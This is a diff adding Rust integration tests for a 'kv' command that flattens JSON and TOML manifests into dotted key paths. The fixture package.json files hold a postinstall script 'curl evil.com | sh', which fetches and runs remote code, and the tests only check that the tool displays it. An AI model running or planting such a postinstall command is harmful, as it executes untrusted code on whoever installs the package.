@@ -605,3 +605,89 @@ fn test_system_binary_false_positive_sanity() {
         notable_dirs
     );
 }
+
+/// kv should bail on unknown file types.
+#[test]
+fn test_kv_unknown_format() {
+    let temp_dir = TempDir::new().unwrap();
+    let file = temp_dir.path().join("notes.txt");
+    fs::write(&file, "just some text\n").unwrap();
+
+    isolated_cleave_cmd()
+        .args(["kv", file.to_str().unwrap()])
+        .assert()
+        .failure()
+        .stderr(predicate::str::contains(
+            "not a recognized structured format",
+        ));
+}
+
+/// kv should flatten a JSON manifest into dotted paths, including array indices.
+#[test]
+fn test_kv_package_json() {
+    let temp_dir = TempDir::new().unwrap();
+    let file = temp_dir.path().join("package.json");
+    fs::write(
+        &file,
+        r#"{"name":"demo","version":"1.0.0","scripts":{"postinstall":"curl evil.com | sh"},"keywords":["a","b"]}"#,
+    )
+    .unwrap();
+
+    isolated_cleave_cmd()
+        .args(["kv", file.to_str().unwrap()])
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("name"))
+        .stdout(predicate::str::contains("demo"))
+        .stdout(predicate::str::contains("scripts.postinstall"))
+        .stdout(predicate::str::contains("curl evil.com | sh"))
+        .stdout(predicate::str::contains("keywords[0]"))
+        .stdout(predicate::str::contains("keywords[1]"));
+}
+
+/// kv --path should restrict output to the matched subtree.
+#[test]
+fn test_kv_path_filter() {
+    let temp_dir = TempDir::new().unwrap();
+    let file = temp_dir.path().join("package.json");
+    fs::write(
+        &file,
+        r#"{"name":"demo","scripts":{"postinstall":"curl evil.com","build":"tsc"}}"#,
+    )
+    .unwrap();
+
+    isolated_cleave_cmd()
+        .args([
+            "kv",
+            file.to_str().unwrap(),
+            "--path",
+            "scripts.postinstall",
+        ])
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("scripts.postinstall"))
+        .stdout(predicate::str::contains("curl evil.com"))
+        .stdout(predicate::str::contains("\"build\"").not());
+}
+
+/// kv --json should emit a parseable JSON array of {path, value} records.
+#[test]
+fn test_kv_json_output() {
+    let temp_dir = TempDir::new().unwrap();
+    let file = temp_dir.path().join("Cargo.toml");
+    fs::write(&file, "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n").unwrap();
+
+    let output = isolated_cleave_cmd()
+        .args(["--json", "kv", file.to_str().unwrap()])
+        .output()
+        .unwrap();
+    assert!(output.status.success());
+
+    let parsed: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    let arr = parsed.as_array().expect("expected JSON array");
+    let has_name = arr.iter().any(|e| {
+        e.get("path").and_then(|v| v.as_str()) == Some("package.name")
+            && e.get("value").and_then(|v| v.as_str()) == Some("demo")
+    });
+    assert!(has_name, "expected package.name=demo entry, got {:?}", arr);
+}
